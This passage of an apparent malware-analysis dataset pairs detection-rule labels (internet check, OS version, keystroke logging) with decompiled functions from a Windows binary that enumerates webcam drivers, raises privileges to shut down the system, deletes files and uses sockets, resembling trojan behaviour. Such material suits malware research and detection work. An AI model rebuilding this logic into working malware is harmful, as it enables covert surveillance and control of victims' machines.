+ iVar16 + uVar2;\n                param_2 = param_2 + 0x10;\n            }\n            while (param_1 != 0) {\n                uVar2 = uVar2 + *param_2;\n                param_2 = param_2 + 1;\n                uVar18 = uVar18 + uVar2;\n                param_1 = param_1 - 1;\n            }\n            uVar2 = uVar2 % 0xfff1;\n            uVar18 = uVar18 % 0xfff1;\n        }\n        uVar2 = uVar18 << 0x10 | uVar2;\n    }\n    return uVar2;\n}\n",
        "token_count": 1305
    },
    "0046f6ac": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0046f6ac(uint32_t param_1, uint param_2)\n\n{\n    int32_t *in_EAX;\n    uint32_t arg_10h;\n    int32_t iVar1;\n    \n    arg_10h = in_EAX[1];\n    if (param_1 < in_EAX[1]) {\n        arg_10h = param_1;\n    }\n    if (arg_10h == 0) {\n        arg_10h = 0;\n    }\n    else {\n        in_EAX[1] = in_EAX[1] - arg_10h;\n        if (*(in_EAX[7] + 0x18) == 1) {\n            iVar1 = fcn.0046e8d8();\n            in_EAX[0xc] = iVar1;\n        }\n        fcn.0046e62c(param_2, *in_EAX, arg_10h);\n        *in_EAX = *in_EAX + arg_10h;\n        in_EAX[2] = in_EAX[2] + arg_10h;\n    }\n    return arg_10h;\n}\n",
        "token_count": 254
    },
    "00473fcc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00473ff3)\n\nint32_t __cdecl fcn.00473fcc(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint *in_EDX;\n    uint var_3ch;\n    uint var_38h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_4h;\n    \n    iVar1 = fcn.0046ebe0(0x38);\n    if (iVar1 == 0) {\n        iVar1 = fcn.0046f19c();\n        if (iVar1 == 1) {\n            *in_EDX = var_28h;\n            iVar1 = fcn.0046f460();\n        }\n        else {\n            fcn.0046f460();\n            if (iVar1 == 0) {\n                iVar1 = -5;\n            }\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 233
    },
    "004748f8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid fcn.004748f8(void)\n\n{\n    uint uVar1;\n    char in_AL;\n    char cVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uchar uVar4;\n    uint uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    puStack44 = &fcn.004748f8::var_1h + 1;\n    puStack56 = &fcn.004748f8::var_1h + 1;\n    uStack48 = 0x474a8d;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    uStack60 = 0x474a5e;\n    uStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    while( true ) {\n        puStack68 = 0x474940;\n        iVar3 = fcn.0048350c();\n        uVar4 = iVar3 == 0;\n        if (iVar3 < 1) break;\n        puStack68 = 0x474931;\n        fcn.0048350c();\n        puStack68 = 0x474936;\n        fcn.00483944();\n    }\n    puStack68 = 0x474951;\n    fcn.0046d960();\n    puStack68 = 0x47495e;\n    fcn.00405974();\n    if (uVar4) {\n        puStack68 = 0x47496d;\n        fcn.0046d960();\n        puStack68 = 0x47497f;\n        fcn.0046a37c();\n    }\n    puStack68 = 0x47498c;\n    fcn.0046d960();\n    puStack68 = 0x474999;\n    fcn.00405974();\n    if (uVar4) {\n        puStack68 = 0x4749a0;\n        fcn.0048260c();\n    }\n    uStack72 = 0x4749ee;\n    uStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    puStack68 = &fcn.004748f8::var_1h + 1;\n    fcn.0046be98();\n    fcn.0046bfd8();\n    fcn.0046c968();\n    fcn.0046ca58();\n    fcn.0046cb48();\n    fcn.0046cc38();\n    fcn.0046c348();\n    fcn.0046c4b8();\n    *in_FS_OFFSET = uStack76;\n    if (in_AL == '\\x01') {\n        puStack68 = 0x474a08;\n        fcn.004886b8();\n    }\n    puStack68 = 0x474a0d;\n    cVar2 = fcn.0046dee4();\n    if (cVar2 == '\\0') {\n        puStack68 = 0x474b28;\n        uStack72 = 0x474a20;\n        fcn.0040f224();\n        uStack72 = 0;\n        uStack76 = 0x474b54;\n        fcn.004058e0();\n        fcn.004677d8();\n    }\n    sub.kernel32.dll_GetCurrentProcessId();\n    fcn.00483944();\n    uVar1 = **0x4925a8;\n    sub.wsock32.dll_closesocket();\n    *in_FS_OFFSET = uVar1;\n    *in_FS_OFFSET = puStack68;\n    uStack60 = 0x474a94;\n    uStack64 = 0x474a8c;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 915
    },
    "004801a4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_40h\n// WARNING: Variable defined which should be unmapped: var_3ch\n// WARNING: Variable defined which should be unmapped: var_48h\n// WARNING: Variable defined which should be unmapped: var_44h\n// WARNING: Variable defined which should be unmapped: var_50h\n// WARNING: Variable defined which should be unmapped: var_4ch\n// WARNING: Variable defined which should be unmapped: var_54h\n// WARNING: Variable defined which should be unmapped: var_58h\n// WARNING: Variable defined which should be unmapped: var_5ch\n// WARNING: Variable defined which should be unmapped: var_60h\n// WARNING: Variable defined which should be unmapped: var_68h\n// WARNING: Variable defined which should be unmapped: var_64h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_eh\n\nvoid fcn.004801a4(void)\n\n{\n    uint arg_8h;\n    char cVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    float10 fVar3;\n    uint uStackY136;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uchar auStack20 [2];\n    uint var_eh;\n    uint var_8h;\n    uint var_4h;\n    \n    _auStack20 = &stack0xfffffffc;\n    iVar2 = 0xd;\n    do {\n        var_4h = 0;\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    var_14h = 0x4803a5;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    fVar3 = fcn.0040bce8();\n    var_20h = SUB84(fVar3, 0);\n    var_1ch = fVar3 >> 0x20;\n    fcn.0040b8f0(&var_8h, var_20h, var_1ch);\n    fVar3 = fcn.0040bce8();\n    var_2ch = SUB84(fVar3, 0);\n    var_28h = fVar3 >> 0x20;\n    fcn.0040bbd0(var_2ch, var_28h);\n    fcn.0046d960();\n    arg_8h = var_14h;\n    fcn.0046d960();\n    fcn.0046d960(var_18h);\n    fcn.0046d960(var_1ch);\n    fcn.0046d7c4(arg_8h);\n    fcn.0046d960();\n    fcn.0048b4bc(var_28h);\n    fcn.00409d60(var_2ch);\n    fcn.00409d60(0x48040c, arg_8h);\n    fcn.00409d60(0x48040c, var_28h);\n    fcn.00409d60(0x480418, var_2ch);\n    fcn.00409d60(arg_8h);\n    fcn.00409d60(0x48040c);\n    fcn.00409d60(var_28h);\n    fcn.00409d60(0x48040c);\n    fcn.004058e0(0x480424, var_2ch);\n    fcn.00489414(&var_8h);\n    fcn.0047fdd8(0x480434, arg_8h);\n    fcn.004058e0(0x48040c);\n    cVar1 = fcn.0046d8d8();\n    fcn.0046d8b8();\n    if (cVar1 != '\\0') {\n        fcn.00489414();\n        fcn.0047fdd8(0x480434, 0x48040c);\n        fcn.004058e0(var_2ch);\n        uStackY136 = fcn.004059dc();\n        sub.kernel32.dll_DeleteFileA();\n    }\n    *in_FS_OFFSET = uStackY136;\n    fcn.00405554(0x4803ac);\n    return;\n}\n",
        "token_count": 1214
    },
    "0048350c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0048350c(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack332;\n    uint uStack328;\n    uchar *puStack324;\n    uint var_134h;\n    uint var_130h;\n    uint var_12ch;\n    uint var_124h;\n    uint var_108h;\n    uint var_4h;\n    \n    puStack324 = 0x483530;\n    fcn.004059cc();\n    uStack328 = 0x4835f3;\n    uStack332 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffeb4;\n    puStack324 = &stack0xfffffffc;\n    iVar1 = fcn.00460c98();\n    if ((iVar1 != -1) && (iVar1 = fcn.00460cb8(),  iVar1 != 0)) {\n        while (iVar1 = fcn.00460cd8(),  iVar1 != 0) {\n            fcn.004057a0();\n            fcn.00409854();\n            fcn.00405b28();\n        }\n    }\n    *in_FS_OFFSET = uStack332;\n    puStack324 = 0x4835fa;\n    uStack328 = 0x4835ea;\n    fcn.00405554();\n    uStack328 = 0x4835f2;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 315
    },
    "004841b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid fcn.004841b0(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    bool bVar3;\n    uint var_38h;\n    uint var_34h;\n    uint *var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    uchar *var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uchar *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_10h = &stack0xfffffffc;\n    var_1ch = &stack0xfffffffc;\n    iVar2 = 7;\n    do {\n        var_4h = 0;\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    var_14h = 0x48451a;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    *0x484562 = 1;\n    bVar3 = true;\n    var_20h = 0x4844de;\n    var_24h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_24h;\n    fcn.00405974();\n    if (bVar3) {\n        fcn.004881f8();\n        fcn.00405818();\n        fcn.004891a0();\n        fcn.004881f8();\n        fcn.00405818();\n        fcn.004891a0();\n        fcn.004881f8(0x48455c);\n        fcn.00405818();\n        fcn.004881f8(var_20h);\n        fcn.00405818();\n        fcn.00488ef4();\n        fcn.004881f8();\n        fcn.00405818();\n        fcn.004890f8();\n        fcn.004881f8();\n        fcn.00405818();\n        uVar1 = fcn.004059dc();\n        sub.kernel32.dll_DeleteFileA(uVar1);\n        fcn.004881f8();\n        fcn.00405818();\n        var_30h = fcn.004059dc();\n        sub.kernel32.dll_DeleteFileA();\n        fcn.00409d60();\n        fcn.004840e4();\n    }\n    else {\n        fcn.00405974();\n        if (bVar3) {\n            fcn.00405b28(&var_4h);\n            fcn.00405a44();\n            fcn.00405b28();\n            fcn.00405a84();\n            fcn.00405b28(&var_8h);\n            fcn.00405a44();\n            fcn.00405b28();\n            fcn.00405a84();\n            var_30h = &var_ch;\n            fcn.00405b28();\n            fcn.00405a44();\n            fcn.00405b28();\n            fcn.00405a84();\n            fcn.004055c8();\n            uVar1 = fcn.00409ecc();\n            uVar1 = fcn.004059dc(uVar1);\n            uVar1 = fcn.004059dc(uVar1);\n            uVar1 = fcn.00409ecc(uVar1);\n            sub.user32.dll_MessageBoxA_1(uVar1);\n        }\n        else {\n            fcn.00405974();\n            if (bVar3) {\n                fcn.00405b28(&var_4h);\n                fcn.00405a44();\n                fcn.00405b28();\n                fcn.00405a84();\n                fcn.004055c8();\n                uVar1 = fcn.00409ecc();\n                var_30h = fcn.00409ecc(uVar1);\n                sub.kernel32.dll_Beep();\n            }\n        }\n    }\n    *in_FS_OFFSET = var_30h;\n    *(var_14h + 0x48) = 0;\n    return;\n}\n",
        "token_count": 995
    },
    "004886b8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool fcn.004886b8(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint uStack64;\n    uchar *puStack60;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uchar auStack44 [40];\n    \n    if (**0x4927cc == 2) {\n        uStack52 = 0x28;\n        uStack56 = 0x4886d0;\n        puStack48 = &stack0xffffffd4;\n        uStack56 = sub.kernel32.dll_GetCurrentProcess();\n        puStack60 = 0x4886d6;\n        iVar1 = sub.advapi32.dll_OpenProcessToken();\n        if (iVar1 != 0) {\n            puStack60 = &stack0xffffffd4;\n            uStack64 = 0x488748;\n            uVar2 = 0;\n            iVar1 = sub.advapi32.dll_LookupPrivilegeValueA(0);\n            puStack60 = 0x1;\n            puStack48 = 0x2;\n            uStack64 = 0;\n            if (iVar1 != 0) {\n                sub.advapi32.dll_AdjustTokenPrivileges\n                          (uVar2, 0, &stack0xffffffc4, 0x10, &stack0xffffffd4, &stack0xffffffc0);\n            }\n        }\n    }\n    iVar1 = sub.user32.dll_ExitWindowsEx();\n    return iVar1 != 0;\n}\n",
        "token_count": 325
    },
    "004897e8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004897e8(code *param_1)\n\n{\n    char in_AL;\n    char cVar1;\n    \n    cVar1 = fcn.0048974c();\n    if (cVar1 != '\\0') {\n        if (in_AL == '\\x01') {\n            (*param_1)(0xffffffff);\n        }\n        else {\n            (*param_1)(0);\n        }\n    }\n    return;\n}\n",
        "token_count": 95
    },
    "0048ad34": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool __fastcall fcn.0048ad34(uint param_1, double *param_2)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    float10 fVar2;\n    uint uStack36;\n    uint uStack32;\n    uchar auStack28 [16];\n    \n    uStack36 = *in_EAX;\n    uStack32 = in_EAX[1];\n    iVar1 = sub.kernel32.dll_FileTimeToSystemTime(&uStack36, auStack28);\n    if (iVar1 != 0) {\n        fVar2 = fcn.0040bbf0();\n        *param_2 = fVar2;\n    }\n    return iVar1 != 0;\n}\n",
        "token_count": 153
    },
    "0048b5fc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0048b5fc(void)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack560;\n    uint uStack556;\n    uchar *puStack552;\n    uint var_214h;\n    uint var_210h;\n    uint var_20ah;\n    uint var_105h;\n    \n    puStack552 = &stack0xfffffffc;\n    uStack556 = 0x48b6c3;\n    uStack560 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffdd0;\n    iVar2 = 0;\n    while (iVar1 = sub.AVICAP32.DLL_capGetDriverDescriptionA\n                             (iVar2, &fcn.0048b5fc::var_105h, 0x105, &fcn.0048b5fc::var_20ah, 0x105),  iVar1 != 0) {\n        fcn.004057a0(*in_EAX);\n        fcn.004057a0(0x48b6dc, 0);\n        fcn.004058e0(0x48b6e8, 0);\n        iVar2 = iVar2 + 1;\n    }\n    *in_FS_OFFSET = uStack560;\n    puStack552 = 0x48b6ca;\n    uStack556 = 0x48b6c2;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 328
    },
    "0048b6ec": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nulong fcn.0048b6ec(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t unaff_EBX;\n    int32_t iStack24;\n    uint uStack20;\n    uint uStack16;\n    \n    uStack16 = 0x48b728;\n    uStack20 = 0x48b738;\n    iStack24 = 0x48b6fe;\n    iStack24 = sub.kernel32.dll_GetModuleHandleA_2();\n    pcVar1 = sub.kernel32.dll_GetProcAddress_1();\n    if (pcVar1 == NULL) {\n        unaff_EBX = 0;\n    }\n    else {\n        uVar2 = sub.kernel32.dll_GetCurrentProcess(&stack0xffffffe8);\n        iVar3 = (*pcVar1)(uVar2);\n        if (iVar3 != 0) {\n            unaff_EBX = iStack24 != 0;\n        }\n    }\n    return CONCAT44(iStack24, unaff_EBX);\n}\n",
        "token_count": 227
    },
    "00403e68": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.00403e68(void)\n\n{\n    fcn.00403d88();\n    return;\n}\n",
        "token_count": 25
    },
    "00403e90": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403e90(uint param_1, int32_t param_2)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    \n    if (2 < *(in_EAX + 1) - 0xd7b1) {\n        iVar1 = fcn.00407688();\n        *(iVar1 + 4) = 0x67;\n        return;\n    }\n    iVar1 = sub.kernel32.dll_SetFilePointer(*in_EAX, in_EAX[2] * param_2, 0, 0);\n    if (iVar1 != -1) {\n        return;\n    }\n    sub.kernel32.dll_GetLastError();\n    fcn.0040307c();\n    return;\n}\n",
        "token_count": 160
    },
    "00404544": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.00404544(void)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack284;\n    uint uStack280;\n    uchar *puStack276;\n    uint var_104h;\n    uint var_4h;\n    \n    puStack276 = &stack0xfffffffc;\n    uStack280 = 0x4045cb;\n    uStack284 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack284;\n    fcn.00404530();\n    fcn.00405794();\n    uVar1 = fcn.0040580c();\n    uVar1 = fcn.004059dc(uVar1);\n    uVar1 = fcn.0040580c(uVar1);\n    uVar1 = fcn.004059dc(uVar1);\n    uVar2 = 0x800;\n    sub.kernel32.dll_CompareStringA(0x800, 1, uVar1);\n    *in_FS_OFFSET = uVar2;\n    fcn.00405530(0x4045d2);\n    return;\n}\n",
        "token_count": 243
    },
    "0040a15c": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040a15c(uint param_1, uint32_t param_2)\n\n{\n    uint uVar1;\n    \n    uVar1 = 0xffffffff;\n    if (((param_2 & 3) < 3) && ((param_2 & 0xf0) < 0x41)) {\n        uVar1 = fcn.004059dc(*((param_2 & 3) * 4 + 0x48f858), *(((param_2 & 0xf0) >> 4) * 4 + 0x48f864), 0, 3, 0x80, 0);\n        uVar1 = sub.kernel32.dll_CreateFileA_1(uVar1);\n    }\n    return uVar1;\n}\n",
        "token_count": 171
    },
    "0040b25d": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040b25d(uint arg_8h, uint noname_1, uint arg_10h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t extraout_ECX;\n    uint32_t uVar3;\n    uint32_t extraout_EDX;\n    int32_t extraout_EDX_00;\n    int32_t iVar4;\n    int32_t unaff_EBP;\n    char *unaff_EDI;\n    char *pcVar5;\n    char *pcVar6;\n    uint var_2ch;\n    uint var_5h;\n    \n    uVar3 = *(unaff_EBP + 8);\n    if (0x11 < uVar3) {\n        uVar3 = 0x12;\n    }\n    iVar2 = *(unaff_EBP + -0x2c);\n    if (iVar2 < 1) {\n        pcVar5 = unaff_EDI + 1;\n        *unaff_EDI = '0';\n    }\n    else {\n        iVar4 = 0;\n        if (*(unaff_EBP + 0x10) != '\\x02') {\n            iVar4 = (*(unaff_EBP + -0x2c) - 1U) % 3 + 1;\n        }\n        while( true ) {\n            pcVar6 = unaff_EDI;\n            cVar1 = fcn.0040b1b2();\n            pcVar5 = pcVar6 + 1;\n            *pcVar6 = cVar1;\n            iVar2 = extraout_ECX + -1;\n            uVar3 = extraout_EDX;\n            if (iVar2 == 0) break;\n            iVar4 = iVar4 + -1;\n            unaff_EDI = pcVar5;\n            if ((iVar4 == 0) && (*(unaff_EBP + -6) != '\\0')) {\n                *pcVar5 = *(unaff_EBP + -6);\n                iVar4 = 3;\n                unaff_EDI = pcVar6 + 2;\n            }\n        }\n    }\n    if (uVar3 != 0) {\n        pcVar6 = pcVar5;\n        if (*(unaff_EBP + -5) != '\\0') {\n            pcVar6 = pcVar5 + 1;\n            *pcVar5 = *(unaff_EBP + -5);\n        }\n        for (; iVar2 != 0; iVar2 = iVar2 + 1) {\n            *pcVar6 = '0';\n            uVar3 = uVar3 - 1;\n            if (uVar3 == 0) {\n                return;\n            }\n            pcVar6 = pcVar6 + 1;\n        }\n        do {\n            cVar1 = fcn.0040b1b2();\n            *pcVar6 = cVar1;\n            pcVar6 = pcVar6 + 1;\n        } while (extraout_EDX_00 != 1);\n    }\n    return;\n}\n",
        "token_count": 648
    },
    "0040eaf8": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.0040eaf8(void)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    \n    *0x4958c8 = 0x409;\n    *0x4958cc = 9;\n    *0x4958d0 = 1;\n    uVar1 = sub.kernel32.dll_GetThreadLocale_1();\n    if (uVar1 != 0) {\n        *0x4958c8 = uVar1;\n    }\n    if (uVar1 != 0) {\n        *0x4958cc = uVar1 & 0x3ff;\n        *0x4958d0 = (uVar1 & 0xffff) >> 10;\n    }\n    puVar3 = 0x40eb9c;\n    puVar4 = 0x48f828;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = *puVar3;\n        puVar3 = puVar3 + 1;\n        puVar4 = puVar4 + 1;\n    }\n    if ((*0x48f7e4 < 5) || (*0x48f7e0 != 2)) {\n        iVar2 = sub.user32.dll_GetSystemMetrics(0x4a);\n        *0x4958d5 = iVar2 != 0;\n    }\n    else {\n        *0x4958d5 = true;\n    }\n    iVar2 = sub.user32.dll_GetSystemMetrics(0x2a);\n    *0x4958d4 = iVar2 != 0;\n    if (*0x4958d4) {\n        fcn.0040ea9c(&stack0xfffffffc);\n    }\n    return;\n}\n",
        "token_count": 403
    },
    "00416678": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00416678(uint param_1, uint *param_2)\n\n{\n    char *pcVar1;\n    code *pcVar2;\n    int32_t *in_EAX;\n    uint *puVar3;\n    uint8_t uVar4;\n    \n    pcVar1 = **param_2;\n    uVar4 = 4;\n    if (*pcVar1 != '\\a') {\n        uVar4 = pcVar1[pcVar1[1] + 2];\n    }\n    pcVar2 = param_2[2];\n    if (*(param_2 + 0xb) == 0xff) {\n        puVar3 = in_EAX + (pcVar2 & 0xffffff);\n        *puVar3 = param_1;\n        if ((1 < uVar4) && (*puVar3 = param_1,  3 < uVar4)) {\n            *puVar3 = param_1;\n        }\n    }\n    else if (*(param_2 + 0xb) < 0xfe) {\n        (*pcVar2)();\n    }\n    else {\n        (**(pcVar2 + *in_EAX))();\n    }\n    return;\n}\n",
        "token_count": 257
    },
    "00420bb4": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00420bb4(int32_t arg_8h, uint arg_ch, uint noname_2, int32_t arg_14h, int32_t *arg_18h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x420c1e;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    if ((arg_14h < 0) || (2 < arg_14h)) {\n        uVar2 = 0x80030001;\n        *in_FS_OFFSET = uStack36;\n    }\n    else {\n        iVar1 = (**(**(arg_8h + 0xc) + 0x14))();\n        if (arg_18h != NULL) {\n            *arg_18h = iVar1;\n            arg_18h[1] = iVar1 >> 0x1f;\n        }\n        uVar2 = 0;\n        *in_FS_OFFSET = uStack36;\n    }\n    return uVar2;\n}\n",
        "token_count": 285
    },
    "00425f8c": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
